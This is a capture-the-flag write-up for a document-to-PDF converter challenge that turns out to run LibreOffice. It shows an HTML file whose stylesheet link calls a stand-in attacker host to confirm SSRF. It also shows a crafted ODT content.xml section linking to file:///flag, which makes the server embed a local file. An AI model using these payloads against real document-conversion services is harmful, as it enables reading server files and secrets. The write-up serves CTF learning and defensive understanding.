# Document-Converter

> Free converter for everyone.\
> You find the flag at : /flag\
> **Link:** http://20.233.9.240:1920

We are given a black-box web challenge. This application allows us to upload files in various formats (.doc, .jpg, etc.) and converts them into a PDF for us to download.

![](<../../.gitbook/assets/Screenshot 2022-04-11 at 11.22.17 AM.png>)

The first thing that came to mind was whether I can upload arbitrary HTML, since HTML has plenty of potential SSRF / file inclusion vectors. Sure enough, when I uploaded the following HTML file, I got a callback to my server.

```markup
<link rel=stylesheet href='http://ATTACKER.COM/exploit.css'>
<html>
    <body>
        Hello world.
    </body>
</html>
```

The `User-Agent` showed that LibreOffice was making the callback.

```http
OPTIONS /exploit.css HTTP/1.1
Host: a255-42-60-216-15.ngrok.io
User-Agent: LibreOffice
Cache-Control: no-cache
Pragma: no-cache
X-Forwarded-For: 20.233.9.240
X-Forwarded-Proto: http
Accept-Encoding: gzip
```

Interesting! So LibreOffice is being used to convert the documents. I searched around a bit and came across [this writeup](https://www.l0l.xyz/sec/2021/01/05/1-webdesktop-root-ssrf.html) on SSRF using LibreOffice documents.

We create a sample LibreOffice word document, `poc.odt`. After unzipping the ODT file, we can modify the `content.xml` file to include our payload. We create a `text:section` tag that links to the `/flag` file.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content ...>
    <office:body>
       <office:text>
       
                ...
                
                <text:section text:name="string"><text:section-source
                                xlink:href="file:///flag" xlink:type="simple" xlink:show="embed"
                                xlink:actuate="onLoad"/></text:section>
        </office:text>
    </office:body>
</office:document-content>
```

Then, zipping the files again into a `modified.odt` gives us our payload. Uploading this to the server gives us the flag!

![](../../.gitbook/assets/Screenshot\_2022-04-10\_at\_8.00.58\_PM.png)
